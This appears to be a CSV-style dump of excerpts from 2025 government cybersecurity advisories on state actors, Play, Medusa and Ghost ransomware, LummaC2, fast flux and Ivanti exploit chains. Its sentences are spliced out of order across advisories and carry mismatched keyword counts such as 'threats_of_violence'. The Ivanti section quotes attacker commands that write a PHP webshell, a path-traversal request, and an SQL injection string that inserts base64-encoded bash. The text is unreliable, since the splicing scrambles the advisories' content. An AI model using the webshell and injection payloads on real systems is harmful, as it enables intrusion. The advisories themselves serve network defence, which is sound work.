The authoring agencies are  continuing to monitor the situation and will release pertinent cyber threat and cyber defense information as  it becomes available. Threat Activity  Based on the current geopolitical environment, Iranian-affiliated cyber actors may target U.S. and foreign government partners, have previously  released advisories describing high-level cyber tactics employed by Iranian-affiliated cyber actors and  general guidance to harden systems and networks against this threat. The authoring agencies strongly  recommend critical infrastructure organizations and other entities review the following resources for more  information on this cyber threat and additional mitigations.  For an overview of the Iranian threat, refer to CISA’s Iran Threat Overview and Advisories and the FBI’s The Iran Threat webpages.  For a list of cybersecurity advisories attributed to Iranian state-sponsored cyber actors, refer to CISA’s Iran State-Sponsored Cyber Threat: Advisories webpage.  For more information on reducing the risk of cyber threats to OT, refer to the joint fact sheet Primary Mitigations to Reduce Cyber Threats to Operational Technology.  For more information on improving cybersecurity and physical defenses, refer to CISA Insights: Increased Geopolitical Tensions and Threats."
People's Republic of China Cyber Threat Activity,2025-06-20,2,{'threats_of_violence': 14},"© His Majesty the King in Right of Canada, as represented   by the Minister of National Defence, 2025  1  D96-129/2025E-PDF  ISBN  978-0-660-77867-9    UNCLASSIFIED / NON CLASSIFIÉ//TLP:CLEAR  People’s Republic of China cyber threat  activity  PRC cyber actors target telecommunications companies as  part of a global cyberespionage campaign  Cyber threat bulletin       2    UNCLASSIFIED / NON CLASSIFIÉ//TLP:CLEAR  Introduction  The Canadian Centre for Cyber Security (Cyber Centre) and the United States’ Federal Bureau of Investigation (FBI) are warning  Canadians of the threat posed by People’s Republic of China (PRC) state-sponsored cyber threat actor tracked in industry  reporting as Salt Typhoon. This  cyber bulletin aims to raise awareness of the threat posed by PRC cyber threat activity, particularly to Canadian  telecommunications organizations, in light of new Salt Typhoon-related compromises of entities in Canada. The threat to Canadian organizations  The Cyber Centre is aware of malicious cyber activities currently targeting Canadian telecommunications companies. Targeting of Canadian devices may allow the threat actors to collect information from the victim’s  internal network, or use the victim’s device to enable the compromise of further victims. In some cases, we assess that the  threat actors’ activities were very likely limited to network reconnaissance. To monitor and mitigate this threat, we encourage Canadian organizations to consult the  guidance linked below on hardening networks, security considerations for edge devices, and additional cyber threat  information pertaining to the PRC. The threat to telecommunications  Telecommunications networks are almost certainly among the highest priority espionage targets for state-sponsored cyber  threat actors. State-sponsored cyber threat actors have persistently compromised TSPs globally, often as part of broad and long-running  intelligence programs to exfiltrate bulk customer data and collect information on high-value targets of interest, such as  government officials. In 2024, partner investigations discovered that PRC state-sponsored cyber threat actors had compromised the networks of  major global TSPs, including US wireless carriers, very likely as part of a targeted espionage operation. The threat actors also collected  the private communications of a limited number of individuals primarily involved in government or political activity. PRC cyber threat actors frequently attempt to compromise trusted service providers, including  telecommunications, managed service providers and cloud service providers, to access client information or networks  indirectly. PRC cyber actors exploit vulnerabilities in edge devices  As we note in the National Cyber Threat Assessment 2025-2026, cyber threat actors are exploiting vulnerabilities in security  and networking devices that sit at the perimeter of networks, including routers, firewalls, and virtual private network (VPN)  solutions. By compromising these edge devices, a cyber threat actor can enter a network, monitor, modify, and exfiltrate  network traffic flowing through the device, or possibly move deeper into the victim network.

#StopRansomware: Play Ransomware,2025-06-04,2,"{'extortion': 5, 'ransomware': 69, 'threats_of_violence': 17, 'malware': 4}","Play ransomware actors employ a  double extortion model, encrypting systems after exfiltrating data. Ransom notes do not include an initial  ransom demand or payment instructions; rather, victims are instructed to contact the threat actors via  email. Impact  Update June 4, 2025:  The Play ransomware group uses a double extortion model [T1657], encrypting systems after exfiltrating  data. If a victim refuses to pay the ransom demand, the ransomware actors threaten to publish  exfiltrated data to their leak site on the Tor network ([.]onion URL). Financial Theft   T1657  Play ransomware actors use a double-extortion model for  financial gain. TLP:CLEAR  TLP:CLEAR  Co-Authored by:   Product ID: AA23-352A          #StopRansomware: Play Ransomware    Summary  Note: This joint Cybersecurity Advisory is part of an ongoing #StopRansomware effort to publish advisories  for network defenders that detail various ransomware variants and ransomware threat actors. These  #StopRansomware advisories include recently and historically observed tactics, techniques, and  procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other  ransomware threats and no-cost resources. Note: Updates to this advisory, originally published December 18, 2023, include:  ▪  June 4, 2025: The advisory was updated to reflect new TTPs employed by Play ransomware group,  as well as provide current IOCs/remove outdated IOCs for effective threat hunting. Update June 4, 2025:  The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and  Australian Signals Directorate’s Australian Cyber Security Centre (ASD's ACSC) are releasing this joint  advisory to disseminate the Play ransomware group’s IOCs and TTPs identified through FBI investigations  as recently as January 2025. End Update  Since June 2022, the Play (also known as Playcrypt) ransomware group has impacted a wide range of  businesses and critical infrastructure in North America, South America, and Europe. Play ransomware was  among the most active ransomware groups in 2024. Organizations should take the following actions today to mitigate cyber threats from Play ransomware:  ▪  Prioritize remediating known exploited vulnerabilities. Update June 4, 2025:  As of May 2025, FBI was aware of approximately 900 affected entities allegedly exploited by the  ransomware actors. End Update  In Australia, the first Play ransomware incident was observed in April 2023, and most recently in November  2023. The Play ransomware group is presumed to be a closed group, designed to “guarantee the secrecy of  deals,” according to a statement on the group’s data leak website. End Update  FBI, CISA, and ASD’s ACSC encourage organizations to implement the recommendations in the Mitigations  section of this CSA to reduce the likelihood and impact of ransomware incidents. TLP:CLEAR  FBI | CISA | ACSC  Page 3 of 18 | Product ID: AA23-352A  TLP:CLEAR  Initial Access  The Play ransomware group gains initial access to victim networks through the abuse of valid accounts,  likely purchased on the dark web [T1078], and exploitation of public-facing applications [T1190],  specifically through known FortiOS (CVE-2018-13379 and CVE-2020-12812) and Microsoft Exchange  (ProxyNotShell [CVE-2022-41040 and CVE-2022-41082]) vulnerabilities. Play ransomware actors have  been observed using external-facing services [T1133] such as Remote Desktop Protocol (RDP) and Virtual  Private Networks (VPN) for initial access. Update June 4, 2025:  Multiple ransomware groups, including initial access brokers with ties to Play ransomware operators,  exploited three vulnerabilities—CVE-2024-57727—in remote monitoring and management (RMM)  tool SimpleHelp [T1190] to conduct remote code execution [T1059.001] at many U.S.-based entities  following the vulnerabilities’ disclosure on 16 January 2025. End Update  Discovery and Defense Evasion  Play ransomware actors use tools like AdFind to run Active Directory queries [TA0007] and Grixba,1 an  information-stealer, to enumerate network information [T1016] and scan for anti-virus software  [T1518.001]. In some instances, cybersecurity researchers have  observed Play ransomware actors using PowerShell scripts to target Microsoft Defender.2  Lateral Movement and Execution  Play ransomware actors use command and control (C2) applications, including Cobalt Strike and  SystemBC, and tools like PsExec to assist with lateral movement and file execution. Once established on a  network, the ransomware actors search for unsecured credentials [T1552] and use the Mimikatz  credential dumper to gain domain administrator access [T1003]. According to open source reporting,3 to  further enumerate vulnerabilities, Play ransomware actors use Windows Privilege Escalation Awesome  Scripts (WinPEAS) [T1059] to search for additional privilege escalation paths. Exfiltration and Encryption  Update June 4, 2025:  The Play ransomware binary is recompiled for every attack, resulting in unique hashes for each  deployment, complicating anti-malware and anti-virus program detection of the ransomware [T1027]. End Update  Play ransomware actors often split compromised data into segments and use tools like WinRAR to  compress files [T1560.001] into .RAR format for exfiltration. The ransom note directs victims to contact the Play ransomware group at an email address ending in  @gmx[.]de or @web[.]de. Play ransomware targets regularly receive phone calls from threat actors encouraging payment and  threatening the release of company information. ESXi Variant   The ESXi variant of Play ransomware invokes shell commands specific to the ESXi environment to conduct  tasks, including powering off all running Virtual Machines (VMs), listing machines names, and setting the  welcome message of the ESXi interface to the campaign-specific ransom note. The ransomware binary  supports command line arguments; however, if no command line arguments are passed, the malware  powers off all VMs and encrypts files related to VMs using randomly generated per-file keys. The ransomware binary employs AES-256 as its encryption algorithm. Like the Windows variant of Play ransomware, the ESXi variant must be recompiled for each campaign. Leveraged Tools  Table 1 lists legitimate tools Play ransomware actors have repurposed for their operations. Tools Leveraged by Play Ransomware Actors  Name  Description  AdFind  Used to query and retrieve information from Active Directory. Play ransomware actors have used it to assist with lateral movement and file  execution. Play  ransomware actors have used it to add accounts to domain controllers.

FBI, CISA, and  ASD’s ACSC recommend that software manufacturers incorporate secure by design and default principles  and tactics into their software development practices to limit the impact of ransomware techniques (such  as threat actors leveraging backdoor vulnerabilities into remote software systems), thus, strengthening the  security posture for their customers. If unable to  patch, then disable Outlook Web Access (OWA) until updates are able to be undertaken.6   ▪  Segment networks [CPG 2.F] to prevent the spread of ransomware. Network segmentation can help  prevent the spread of ransomware by controlling traffic flows between—and access to—various  subnetworks and by restricting adversary lateral movement.7  ▪  Identify, detect, and investigate abnormal activity and potential traversal of the indicated  ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a  tool that logs and reports all network traffic, including lateral movement activity on a network [CPG  1.E]. Resources  ▪  Stopransomware.gov is a whole-of-government approach that gives one central location for  ransomware resources and alerts. ▪  Resource to mitigate a ransomware attack: #StopRansomware Guide. ▪  No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment. Furthermore, payment may also embolden adversaries to target additional organizations,  encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, FBI and CISA urge you to  promptly report ransomware incidents to a local FBI Field Office, FBI’s Internet Crime Complaint Center  (IC3), or CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870). Australian organizations that have been impacted or require assistance in regard to a ransomware incident  can contact ASD's ACSC via 1300 CYBER1 (1300 292 371), or by submitting a report to cyber.gov.au.

Threat  SRG has been operating since 2022 and has primarily been known for their callback phishing  emails, masquerading as well-known businesses who offer subscription plans. Typically, SRG  phishing emails purport to charge small amounts of “subscription fees” as they are less likely to     TLP:CLEAR  generate immediate suspicion. Similar to their phishing emails posing as a company with a subscription, once SRG exfiltrates  data, they extort the victim by sending them a ransom email threatening to sell or post the data  online. For SRG threat actors:   Conduct staff training on resisting phishing attempts   Develop and communicate policies surrounding when and how company’s IT will  authenticate themselves with employees   Maintain regular backups of company data   Implement two-factor authentication for all employees       Information Requested  The FBI is seeking any information from SRG victims that can be legally shared, including:   Ransom Note copy   Phone number used by Threat Actor   Communications with Threat Actor to include voicemails   Cryptocurrency wallet information   Special sensitivities of stolen data   Original call back message or phishing email    Your organization has no obligation to respond or provide information back to FBI in response  to this product. PIN Number  The following information is being provided by the FBI, with no guarantees or warranties, for potential  use at the sole discretion of recipients to protect against cyber threats. In order to cancel the fake subscription, the victim is instructed  to call the threat actor who emails a link which downloads remote access software giving the  actor access to their device or system. Once the actor has established persistent access, the  threat actors will seek to identify valuable information to exfiltrate, before sending a ransom  notice to the victim threatening to share the victim’s data if a ransom is not paid."

Continuously improve data security measures to keep pace with evolving threats and  vulnerabilities, learn from security incidents, stay up to date with emerging technologies,  and maintain a robust security posture. Threats can stem from large-scale data collected and curated by third parties, as well as  from data that is not sufficiently protected after ingestion. From the moment data is ingested for use with AI systems, the data acquirer must  secure it against insider threats and malicious network activity to prevent unauthorized  modification. In some cases, effective techniques can  cost as little as $60 USD (e.g., COYO-700M), making this a viable threat from low- resource threat actors.

The FBI and CISA encourage organizations to implement the recommendations in the Mitigations section of  this advisory to reduce the likelihood and impact of LummaC2 malware. May 21, 2025   TLP:CLEAR  FBI | CISA  Page 2 of 14 | Product ID: AA25-141B  TLP:CLEAR  Overview  LummaC2 malware first appeared for sale on multiple Russian-language speaking cybercriminal forums in  2022. Once a victim’s computer system is infected, the malware can exfiltrate sensitive user information,  including personally identifiable information, financial credentials, cryptocurrency wallets, browser  extensions, and multifactor authentication (MFA) details without immediate detection [TA0010, T1119]. Message Box  If the user selects No, the malware will exit. If the user selects Yes, the malware will move on to its next  routine, which decrypts its callback Command and Control (C2) domains [T1140]. Code Saving Successful Callback Request  Once a valid C2 domain is contacted and saved, the malware moves on to the next routine, which queries  the user’s name and computer name utilizing the Application Programming Interfaces (APIs)  GetUserNameW and GetComputerNameW respectively [T1012]. This is most  likely a failsafe to prevent the malware from running on the attacker’s system, as its algorithms are one- way only and will not reveal information on the details of the attacker’s own hostname and username. If the username and hostname check function returns zero (does not match the hard-coded values), the  malware will enter its main callback routine. The LummaC2 malware will contact the saved hostname from  the previous check and send the following POST request (see Figure 6). Once decoded, the C2 data is in a JSON format and is  parsed by the LummaC2 malware. Take Screenshot  If the configuration JSON file has a key of “se” and its value is “true,” the malware will take a screenshot  in BMP format and upload it to the C2 server. Delete Self  If the configuration JSON file has a key of “ad” and its value is “true,” the malware will enter a routine to  delete itself. Decoded Command Line in Memory  Host Modifications  Without any C2 interactions, the LummaC2 malware does not create any files on the infected drive.

The countries with targeted entities include the following, as illustrated in Figure 1:    Bulgaria    Czech Republic    France    Germany    Greece    Italy    Moldova      Netherlands    Poland    Romania    Slovakia    Ukraine    United States    Figure 1: Countries with Targeted Entities  Initial Access TTPs  To gain initial access to targeted entities, unit 26165 actors used several techniques to  gain initial access to targeted entities, including (but not limited to):    Credential guessing [T1110.001] / brute force [T1110.003]     Spearphishing for credentials [T1566]    Spearphishing delivering malware [T1566]    Outlook NTLM vulnerability (CVE-2023-23397)    Roundcube vulnerabilities (CVE-2020-12641, CVE-2020-35730, CVE-2021-44026)    Exploitation of Internet-facing infrastructure, including corporate VPNs [T1133], via  public vulnerabilities and SQL injection [T1190]    Exploitation of WinRAR vulnerability (CVE-2023-38831)          TLP:CLEAR  U/OO/157019-25 | PP-25-2107 | May 2025 Ver. Spearphishing  GRU unit 26165 actors’ spearphishing emails included links [T1566.002] leading to fake  login pages impersonating a variety of government entities and Western cloud email  providers’ webpages. The subjects of spearphishing  emails were diverse and ranged from professional topics to adult themes. Phishing  emails were frequently sent via compromised accounts or free webmail accounts  [T1586.002, T1586.003]. 1.0  TLP:CLEAR  Russian GRU Targeting Western Logistics Entities and Technology Companies  6    Dynu     Mocky    Pipedream    Mockbin[.]org  The actors also used spearphishing to deliver malware (including HEADLACE and  MASEPIE) executables [T1204.002] delivered via third-party services and redirectors  [T1566.002], scripts in a mix of languages [T1059] (including BAT [T1059.003] and  VBScript [T1059.005]) and links to hosted shortcuts [T1204.001]. In at least one instance, the actors attempted to use voice phishing [T1566.004] to gain  access to privileged accounts by impersonating IT staff.

Malware  Unit 26165’s use of malware in this campaign ranged from gaining initial access to  establishing persistence and exfiltrating data. In some cases, the attack chain resulted  in multiple pieces of malware being deployed in succession. The actors used dynamic  link library (DLL) search order hijacking [T1574.001] to facilitate malware execution. There were a number of known malware variants tied to this campaign against logistics  sector victims, including:    HEADLACE [7]    MASEPIE [8]  While other malware variants, such as OCEANMAP and STEELHOOK, [8] were not  directly observed targeting logistics or IT entities, their deployment against victims in  other sectors in Ukraine and other Western countries suggest that they could be  deployed against logistics and IT entities should the need arise. Exfiltration  GRU unit 26165 actors used a variety of methods for data exfiltration that varied based  on the victim environment, including both malware and living off the land binaries.

The authoring agencies and industry partners have observed BADBAZAAR and  MOONSHINE specifically targeting individuals connected to topics considered by  the Chinese state to be a threat to their domestic authority, ambitions and global  reputation. This advisory aims to help those at risk respond effectively to the specific threat  from  BADBAZAAR  and  MOONSHINE  spyware. Page 4 of 30  The threat  MOONSHINE and BADBAZAAR are examples of trojans; they have malicious  functions hidden inside an otherwise functioning app that can be downloaded  from app stores or online file-sharing services.

The National Security Agency (NSA), Cybersecurity and Infrastructure Security Agency  (CISA), Federal Bureau of Investigation (FBI), Australian Signals Directorate’s  Australian Cyber Security Centre (ASD’s ACSC), Canadian Centre for Cyber Security  (CCCS), and New Zealand National Cyber Security Centre (NCSC-NZ) are releasing  this joint cybersecurity advisory (CSA) to warn organizations, Internet service providers  (ISPs), and cybersecurity service providers of the ongoing threat of fast flux enabled  malicious activities as a defensive gap in many networks. This advisory is meant to  encourage service providers, especially Protective DNS (PDNS) providers, to help  mitigate this threat by taking proactive steps to develop accurate, reliable, and timely  fast flux detection analytics and blocking capabilities for their customers. This CSA also  provides guidance on detecting and mitigating elements of malicious fast flux by  adopting a multi-layered approach that combines DNS analysis, network monitoring,  and threat intelligence. 1.0  TLP:CLEAR  Fast Flux: A National Security Threat  2  Technical details  When malicious cyber actors compromise devices and networks, the malware they use  needs to “call home” to send status updates and receive further instructions. 1.0  TLP:CLEAR  Fast Flux: A National Security Threat  3  Note: This behavior can also be used for legitimate purposes for performance  reasons in dynamic hosting environments, such as in content delivery networks  and load balancers. 1.0  TLP:CLEAR  Fast Flux: A National Security Threat  4    Bulletproof hosting (BPH) services offer Internet hosting that disregards or  evades law enforcement requests and abuse notices. 1.0  TLP:CLEAR  Fast Flux: A National Security Threat  5  used for maintaining high availability for cybercriminal forums and marketplaces, making  them resilient against law enforcement takedown efforts.

Conclusion  Fast flux represents a persistent threat to network security, leveraging rapidly changing  infrastructure to obfuscate malicious activity. By implementing robust detection and  mitigation strategies, organizations can significantly reduce their risk of compromise by  fast flux-enabled threats. 1.0  TLP:CLEAR  Fast Flux: A National Security Threat  10  Disclaimer of endorsement  The information and opinions contained in this document are provided ""as is"" and without any warranties or  guarantees. Purpose  This document was developed in furtherance of the authoring cybersecurity agencies’ missions, including their  responsibilities to identify and disseminate threats, and develop and issue cybersecurity specifications and  mitigations. Figure 2: Double flux technique  Both techniques leverage a large number of compromised hosts, usually as a botnet  from across the Internet that acts as proxies or relay points, making it difficult for  network defenders to identify the malicious traffic and block or perform legal  enforcement takedowns of the malicious infrastructure. As a fast flux network rapidly rotates through botnet  devices, it is difficult for law enforcement or abuse notifications to process the  changes quickly and disrupt their services. This is because malicious cyber actors’ C2  botnets are constantly changing the associated IP addresses throughout the  investigation. Figure 3: Example dark web fast flux advertisement  The BPH provider further explained that numerous malicious activities beyond C2,  including botnet managers, fake shops, credential stealers, viruses, spam mailers, and  others, could use fast flux to avoid identification and blocking."
#StopRansomware: Medusa Ransomware,2025-03-12,1,"{'phishing': 3, 'extortion': 4, 'ransomware': 19, 'threats_of_violence': 17, 'malware': 1}","Medusa IABs  (affiliates) are known to make use of common techniques, such as:    Phishing campaigns as a primary method for stealing victim credentials [T1566]. These email addresses are not  associated with phishing activity conducted by Medusa actors. Phishing  T1566  Medusa IABS used phishing campaigns as a primary method for  delivering ransomware to victims. Both Medusa developers and affiliates—referred to as “Medusa actors” in this advisory— employ a double extortion model, where they encrypt victim data and threaten to publicly release  exfiltrated data if a ransom is not paid. Extortion  Medusa RaaS employs a double extortion model, where victims must pay [T1657] to decrypt files and  prevent further release. Ransom demands are posted on the site, with direct hyperlinks to Medusa affiliated cryptocurrency wallets. FBI investigations identified that after paying the ransom, one victim was contacted by a separate Medusa  actor who claimed the negotiator had stolen the ransom amount already paid and requested half of the  payment be made again to provide the “true decryptor”— potentially indicating a triple extortion scheme.

The Medusa ransomware variant is unrelated to the MedusaLocker variant and the  Medusa mobile malware variant per the FBI’s investigation. FBI, CISA, and MS-ISAC encourage organizations to implement the recommendations in the Mitigations  section of this advisory to reduce the likelihood and impact of Medusa ransomware incidents. Background  The RaaS Medusa variant has been used to conduct ransomware attacks from 2021 to present. Medusa  originally operated as a closed ransomware variant, meaning all development and associated operations  were controlled by the same group of cyber threat actors.   Segment networks to prevent the spread of ransomware. Network segmentation can help prevent  the spread of ransomware by controlling traffic flows between—and access to—various subnetworks  and by restricting adversary lateral movement [CPG 2.F].   Identify, detect, and investigate abnormal activity and potential traversal of the indicated  ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a  tool that logs and reports all network traffic, including lateral movement activity on a network. Resources    Joint #StopRansomware Guide. The FBI, CISA, and MS-ISAC do not encourage paying ransoms as payment does not guarantee victim files  will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations,  encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, FBI, CISA, and MS-ISAC  urge you to promptly report ransomware incidents to FBI’s Internet Crime Complaint Center (IC3), a local  FBI Field Office, or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center  (report@cisa.gov) or by calling 1-844-Say-CISA (1-844-729-2472).

CISA and NIST based the CPGs on existing cybersecurity  frameworks and guidance to protect against the most common and impactful threats, tactics, techniques,  and procedures. Timely patching is one of the most  efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity  threats. This prevents threat actors from directly connecting to remote access services  that they have established for persistence. If threat actors are  not able to run these tools, they will have difficulty escalating privileges and/or moving laterally  [CPG 2.E, 2.N]. Validate Security Controls  In addition to applying mitigations, the FBI, CISA, and MS-ISAC recommend exercising, testing, and  validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&CK  Matrix for Enterprise framework in this advisory.

Ghost actors rotate their ransomware executable payloads, switch file extensions for encrypted files,  modify ransom note text, and use numerous ransom email addresses, which has led to variable attribution  of this group over time. Samples of ransomware files Ghost used during attacks are:  Cring.exe, Ghost.exe, ElysiumO.exe, and Locker.exe. The FBI, CISA, and MS-ISAC encourage organizations to implement the recommendations in the Mitigations  section of this advisory to reduce the likelihood and impact of Ghost ransomware incidents. In multiple instances, they have been observed proceeding from initial compromise to the  deployment of ransomware within the same day. Impact and Encryption  Ghost actors use Cring.exe, Ghost.exe, ElysiumO.exe, and Locker.exe, which are all ransomware  executables that share similar functionality. The nature of executables’ operability is based on command line  arguments used when executing the ransomware file. These ransomware payloads clear Windows Event Logs [T1070.001], disable the Volume Shadow Copy  Service, and delete shadow copies to inhibit system recovery attempts [T1490]. Data encrypted with Ghost  ransomware variants cannot be recovered without the decryption key. The impact of Ghost ransomware activity varies widely on a victim-to-victim basis.

Table 13: Impact  Technique Title   ID  Use  Data Encrypted for  Impact  T1486  Ghost actors use ransomware variants Cring.exe, Ghost.exe,  ElysiumO.exe, and Locker.exe to encrypt victim files for ransom. Mitigations  The FBI, CISA, and MS-ISAC recommend organizations reference their #StopRansomware Guide and  implement the mitigations below to improve cybersecurity posture on the basis of the Ghost ransomware  activity. Ghost ransomware victims whose backups were unaffected by the  ransomware attack were often able to restore operations without needing to contact Ghost actors  or pay a ransom. Ransomware activity generates  unusual network traffic across all phases of the attack chain. Organizations that can successfully identify and investigate this activity  are better able to interrupt malicious activity before ransomware is executed [CPG 3.A]. Victims who have identified and responded to this  unusual behavior have successfully prevented Ghost ransomware attacks. Furthermore, payment may also embolden adversaries to target additional organizations,  encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you  to promptly report ransomware incidents to FBI’s Internet Crime Complain Center (IC3), a local FBI Field  Office, or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center (report@cisa.gov)  or by calling 1-844-Say-CISA (1-844-729-2472).

According to CISA and trusted third-party incident response data, threat actors chained the listed  vulnerabilities to gain initial access, conduct remote code execution (RCE), obtain credentials, and implant  webshells on victim networks. See the MITRE  ATT&CK Tactics and Techniques section of this advisory for a table of the threat actors’ activity mapped to  MITRE ATT&CK tactics and techniques. In September 2024, Ivanti released two Security Advisories disclosing exploitation of CVE-2024-8190 and  CVE-2024-8963.[2][3] In October 2024, Ivanti released another advisory disclosing exploitation of CVE- 2024-9379 and CVE-2024-9380.[1]    CVE-2024-8963 [CWE-22: Path Traversal] is an administrate bypass vulnerability that allows threat  actors to remotely access restricted features within the appliance. When used in conjunction with  CVE-2024-8190 [CWE-78: OS Command Injection], threat actors can remotely authenticate into a  victims’ network and execute arbitrary commands on the appliance [T1219].[2][3]    CVE-2024-9379 [CWE-89: SQL Injection] allows a remote authenticated attacker with admin  privileges to run arbitrary SQL statements.[1]    CVE-2024-9380 [CWE-77: Command Injection] allows a remote authenticated attacker with admin  privileges to obtain RCE.[1]  According to Ivanti’s advisories and industry reporting, these vulnerabilities were exploited as zero days.[4]  Based on evidence of active exploitation, CISA added CVE-2024-8963, CVE-2024-8190, CVE-2024-9379,  and CVE-2024-9380 to its Known Exploited Vulnerabilities (KEV) Catalog. According to CISA and trusted third-party incident response data, threat actors chained the above listed  vulnerabilities to gain initial access, conduct RCE, obtain credentials, and implant webshells on victim  networks. Exploit Chain 1  The threat actors leveraged CVE-2024-8963 in conjunction with remote code execution vulnerabilities,  CVE-2024-8190 and CVE-2024-9380. Acting as a nobody user [T1564.002], the threat actors first sent a  GET request to datetime.php to acquire session and cross-site request forgery (CSRF) tokens using GET  /client/index.php%3F.php/gsb/datetime[.]php [T1071.001]. In some cases, the threat actors exfiltrated the encrypted admin credentials then decrypted them offline  [TA0010]. In other cases, the threat actors leveraged an executable matching the regular expression  php\w{6} located in the /tmp directory to decrypt the credentials prior to exfiltration—this tool was  unrecoverable. In one confirmed compromise, the threat actors tried to create webshells using two different paths:    echo ""<?php system(@  \$_REQUEST['a']);"">/opt/ivanti/csa/broker/webroot/client/help.php    echo ""<?php system('/bin/sudo '. In another compromise, the threat actors maintained their presence on the victim’s system for a longer  amount of time. The threat actors used sudo commands to disable the vulnerability in DateTimeTab.php,  modify and remove webshells, and remove evidence of exploitation [T1548.003]. Lateral Movement  In one case, there was evidence of lateral movement after the threat actors gained access and established  a foothold through this exploit chain. It is suspected that the threat actors gained access into a Jenkins  server running a vulnerable, outdated version [T1068]. The threat actors then  attempted to log into the Virtual Private Network (VPN) server but were unsuccessful. After the threat actors gained initial access, they attempted to exploit CVE-2024-9379 to create a webshell  to gain persistent access. In the POST body, threat actors entered the following  string in the lockout attempts input box: LOCKOUTATTEMPTS = 1 ;INSERT INTO  user_info(username, accessed, attempts) VALUES ('''echo -n  TnNhV1Z1ZEM5b1pXeHdMbk>>/.k''', NOW(), 10). Regardless, the application processed both commands, allowing the threat actors to insert a  user into the user_info table. After inserting valid bash code as a user in the user_info table, the threat actors attempted to login as  the user. The authoring agencies believe the threat actors knew this login would fail but were attempting to  coerce the application into handling the bash code improperly. The threat actors repeated the process of echo commands until they built a valid web shell [T1059]. However, there were no observations that the threat actors were successful. Victim Organization 2  This organization had an endpoint protection platform (EPP) installed on their system that alerted when the  threat actors executed base64 encoded script to create webshells. This threat activity included the download and deployment of Obelisk and GoGo Scanner, which  generated a large number of logs.

Resources: OWASP Hardcoded Password, OWASP Secrets Management   TLP:CLEAR  TLP:CLEAR  8  CISA | FBI  Security Features  9) For use in service of critical infrastructure or national critical functions, Information technology (IT)  products that do not support multi-factor authentication (MFA), including phishing-resistant MFA, in  the baseline version of the product are dangerous and significantly elevate risk to national security,  national economic security, and national public health and safety. Note: Other phishing-resistant forms of authentication, such as passkeys, meet this definition even if  they are the sole form of authentication. Recommended action: For all products besides excepted OT products listed above, software  manufacturers should either support MFA, including phishing-resistant MFA, natively in the product  (if the product itself handles authentication) or support the use of an external identity provider in the  baseline version of the product, such as via standards-based single sign on. Items present in  this list were chosen based on the threat landscape as representing the most dangerous and  pressing bad practices that software manufacturers should avoid. For OT products where MFA use may introduce safety risks (e.g., on medical devices in emergency  rooms where delay in physician access could lead to patient harm), manufacturers should employ  authentication measures that effectively mitigate the threat of single-factor credential abuse and  other authentication threats. Manufacturers should publish a threat model detailing this approach."

Cyber threat  actors can easily exploit these weaknesses across multiple victims to gain access to control systems. Secure Controls: The product is resilient to threat actors sending malicious emergency, safety, or  diagnostic commands; protects the availability of essential functions; withstands active security  scanning; and minimizes the impact of an incident on the overall system. Threat Modeling: The product has a full and detailed threat model. Seek out products that have an  up-to-date threat model that articulates the ways in which it might be compromised, along with  security measures implemented to reduce these threat scenarios. By rigorously enforcing purchasing decisions that require and prioritize the purchase of products that  enforce these elements, critical infrastructure organizations can help mitigate current and emerging cyber  threats to critical infrastructure and create a path away from legacy environments. 9  Open Standards ...............................................................................................................................................10  Ownership .........................................................................................................................................................11  Protection of Data ............................................................................................................................................12  Secure by Default .............................................................................................................................................12  Secure Communications ..................................................................................................................................14  Secure Controls ................................................................................................................................................15  Strong Authentication ......................................................................................................................................16  Threat Modeling ...............................................................................................................................................17  Vulnerability Management ...............................................................................................................................18  Upgrade and Patch Tooling..............................................................................................................................20  Resources ...................................................................................................................................................... Achieving the right balance is more important than ever as threat actors  increasingly target OT products. Threat actors are successfully targeting particular OT products, rather than specific organizations, because  vulnerabilities span multiple victims and critical infrastructure sectors, and OT products can be access  points to control systems. Threat actors can easily exploit common weaknesses in OT products, such as  weak authentication and authorization, known software vulnerabilities, and limited logging. It is difficult  and costly for asset owners to defend themselves against these threats if security is not considered and  implemented in the design and development of their OT products. The priority elements were selected to mitigate current cyber threats to OT and adhere to common legal  requirements to encourage business practices that empower asset owners to recover the infrastructure  they are responsible for and develop foundational security elements that are uncommon in OT. By ensuring the deployment of secure products on their networks, critical infrastructure owners and  operators can reduce the potential damage from cyber threats and protect their systems from exploitation. Threat Modeling  11. Asset owners and operators need this validation to detect and prevent a threat actor from  establishing persistence on OT devices. Owners and operators must be able to recover from incidents in which a threat actor establishes a foothold  or wipes a component on the OT network. Logging is necessary to detect incidents, provide indicators of compromise, and track threat actor  behavior. Buyers should then seek manufacturers that supplement  minimum log types with information from the manufacturer’s written threat model (see the Threat Model  section). Without logs, cyber threat actors can establish persistence through configuration or logic changes, or  degrade operational efficiency, without leaving a record of the action for the operator or incident  responders. For further guidance on OT logging, see the joint guide Best practices for event logging and  threat detection. Why this matters: OT data rarely changes and is valuable for threat actors trying to understand a system. This data underpins the  engineering of the system and gives a threat actor the information needed to create a targeted effect  beyond denial of service. Secure by Default  Selection criteria: The product is delivered secure out of the box, resilient against the most prevalent  threats and vulnerabilities, without requiring additional configuration from users or administrators. The goal of this consideration is to configure security into OT products such that protection against the  most prevalent threats is included by default at no additional cost to the buyer.   Including default configurations that protect against prevalent threats. Without  authentication, cyber threat actors can impersonate any device and send safety-impacting commands  across the network; without encryption, cyber threat actors can read sensitive network traffic. Secure by Demand: Priority Considerations for Operational Technology Owners and Operators when Selecting Digital Products    January 13, 2025  TLP:CLEAR  CISA | NSA | FBI | EPA | TSA | ASD’s ACSC | CCCS |  Page | 15  DG CONNECT | BSI | NCSC-NL | NCSC -NZ | NCSC-UK  TLP:CLEAR  Secure Controls  Selection criteria: The 